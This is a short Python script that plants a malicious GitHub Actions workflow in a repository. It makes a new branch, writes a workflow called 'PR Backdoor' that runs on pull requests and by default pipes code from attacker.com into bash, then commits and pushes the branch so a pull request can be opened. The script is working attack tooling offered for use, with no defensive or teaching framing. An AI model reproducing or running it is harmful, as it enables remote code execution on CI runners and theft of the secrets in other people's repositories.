import os
import subprocess

def inject_workflow_backdoor_pr(repo_path: str, payload: str = "curl attacker.com | bash") -> str:
    try:
        branch = f"backdoor-pr-{os.urandom(3).hex()}"
        subprocess.run(["git", "checkout", "-b", branch], cwd=repo_path, check=True)

        workflows_path = os.path.join(repo_path, ".github", "workflows")
        os.makedirs(workflows_path, exist_ok=True)
        workflow_file = os.path.join(workflows_path, "exploit.yml")

        content = f"""name: PR Backdoor

on: [pull_request]

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Execute
        run: {payload}
"""
        with open(workflow_file, 'w') as f:
            f.write(content)

        subprocess.run(["git", "add", workflow_file], cwd=repo_path, check=True)
        subprocess.run(["git", "commit", "-m", "Add PR backdoor workflow"], cwd=repo_path, check=True)
        subprocess.run(["git", "push", "--set-upstream", "origin", branch], cwd=repo_path, check=True)

        return f"✅ Malicious PR branch '{branch}' created and pushed. You can now open a PR via GitHub."

    except Exception as e:
        return f"❌ Error injecting backdoor via PR: {str(e)}"
